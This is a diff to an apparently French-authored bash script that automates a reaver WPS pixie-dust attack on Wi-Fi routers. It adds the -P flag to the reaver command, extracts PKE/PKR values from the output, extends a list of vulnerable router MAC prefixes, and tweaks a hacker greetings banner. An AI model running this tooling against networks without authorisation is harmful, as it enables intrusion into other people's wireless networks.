@@ -34,7 +34,7 @@ exit
 }
 arguments() {
 						   echo "" > empty.txt
-                           reaver -i $mon -b $BSSID -c $CHANNEL -vv -n -L -s empty.txt > Reaver.txt &
+                           reaver -i $mon -b $BSSID -c $CHANNEL -vvv -n -L -P -s empty.txt > Reaver.txt &
 						   ReaverID=$!
    						   e=`cat Reaver.txt | grep PKE: | cut -d' ' -f3 | sed -n 1p`
                            r=`cat Reaver.txt | grep PKR: | cut -d' ' -f3 | sed -n 1p`
@@ -341,6 +341,7 @@ Vun_MAC[37]="28:28:5D"
 Vun_MAC[38]="A6:3E:CF"
 Vun_MAC[39]="A6:44:11"
 Vun_MAC[40]="78:54:2E"
+Vun_MAC[41]="CE:6E:1B"
 re='Y'
 while [ "$re" == 'Y' ] || [ "$re" == 'y' ] || [ "$re" == 'Yes' ] || [ "$re" == 'YES' ] || [ "$re" == 'yes' ] || [ "$re" == 'O' ] || [ "$re" == 'o' ] || [ "$re" == 'Oui' ] || [ "$re" == 'OUI' ] || [ "$re" == 'oui' ]
 do
@@ -529,7 +530,7 @@ case $menu in
 								             CLIENT="No"
 			                            fi
 			                            echo -e -n " $Yellow["$i"]\t"
-										for (( c=0; c<=40; c++))
+										for (( c=0; c<=41; c++))
 										    do
 											  if [ "$Ver_vun" == "${Vun_MAC[$c]}" ]
 											       then
@@ -836,7 +837,7 @@ if [ "$re" != "yes" ]
          echo -e "             ########################################################"
          sleep 0.1
          echo ""
-         echo -e "$White [+]$Green Greetz to ${White}: ${Cyan}AKAS${White} - ${Cyan}X-MISS${White} - ${Cyan}fantome195${White} & ${Cyan}Hackshow."
+         echo -e "$White [+]$Green Greetz to ${White}: ${Cyan}AKAS${White} - ${Cyan}X-MISS${White} - ${Cyan}fantome195${White} & ${Cyan}Hackshow${White}."
          echo ""
 fi
    while [ "$re" != 'Y' ] && [ "$re" != 'y' ] && [ "$re" != 'Yes' ] && [ "$re" != 'YES' ] && [ "$re" != 'yes' ] && [ "$re" != 'N' ] && [ "$re" != 'n' ] && [ "$re" != 'No' ] && [ "$re" != 'NO' ] && [ "$re" != 'no' ] && [ "$re" != 'O' ] && [ "$re" != 'o' ] && [ "$re" != 'Oui' ] && [ "$re" != 'OUI' ] && [ "$re" != 'oui' ] && [ "$re" != "\n" ]
